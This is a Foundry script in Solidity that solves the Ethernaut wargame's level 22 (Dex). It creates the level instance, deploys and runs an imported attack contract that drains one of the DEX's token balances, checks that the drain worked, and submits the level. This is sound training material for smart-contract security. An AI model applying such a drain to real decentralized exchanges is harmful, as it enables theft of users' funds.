// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import { Script, console2 } from "forge-std/Script.sol";
import { Vm } from "forge-std/Vm.sol";
import { Ethernaut } from "src/interfaces/IEthernaut.sol";
import { Dex, SwappableToken } from "src/Level22.sol";
import { L22Attack } from "src/Level22Attack.sol";

contract Attack is Script {
    Ethernaut ethernaut = Ethernaut(vm.envAddress("ETHERNAUT"));

    function run() public {
        uint256 deployerPrivateKey = uint256(vm.envBytes32("DEPLOYER_PRIVATE_KEY"));
        vm.startBroadcast(deployerPrivateKey);
        vm.recordLogs();
        ethernaut.createLevelInstance(0xB468f8e42AC0fAe675B56bc6FDa9C0563B61A52F);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        address instanceAddress = address(uint160(uint256(entries[11].topics[2])));
        console2.log(instanceAddress);
        Dex instance = Dex(instanceAddress);

        L22Attack attack = new L22Attack(instance);
        instance.approve(address(attack), type(uint256).max);

        attack.attack();

        SwappableToken token1 = SwappableToken(instance.token1());
        SwappableToken token2 = SwappableToken(instance.token2());
        require(token1.balanceOf(instanceAddress) == 0 || token2.balanceOf(instanceAddress) == 0, "Attack failed");

        ethernaut.submitLevelInstance(instanceAddress);
        vm.stopBroadcast();
    }
}
